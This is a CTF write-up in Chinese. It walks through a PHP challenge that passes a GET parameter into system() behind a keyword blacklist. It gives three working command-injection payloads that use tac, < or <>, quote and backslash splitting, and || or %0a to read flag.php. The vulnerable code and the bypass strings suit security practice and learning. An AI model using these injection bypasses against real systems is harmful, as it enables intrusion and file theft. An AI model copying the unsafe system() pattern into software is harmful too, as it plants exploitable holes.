```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:59:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

分析源码

过滤了

;

cat

flag

空格

数字

$

*

more

less

head

sort

tail

同样无回显





### 第一种

同上一题

利用<绕过空格

利用''绕过字母

```
?c=ls||
```

![image-20250403153555276](./assets/image-20250403153555276.png)

```
?c=tac<fl''ag.php||
```

![image-20250403153637344](./assets/image-20250403153637344.png)





### 第二种

利用<>绕过空格

```
?c=tac<>fl''ag.php||
```

![image-20250403153713498](./assets/image-20250403153713498.png)





### 第三种

利用%0a绕过无回显

利用\绕过字母

```
?c=tac<>fl\ag.php%0a
```

![image-20250403153949482](./assets/image-20250403153949482.png)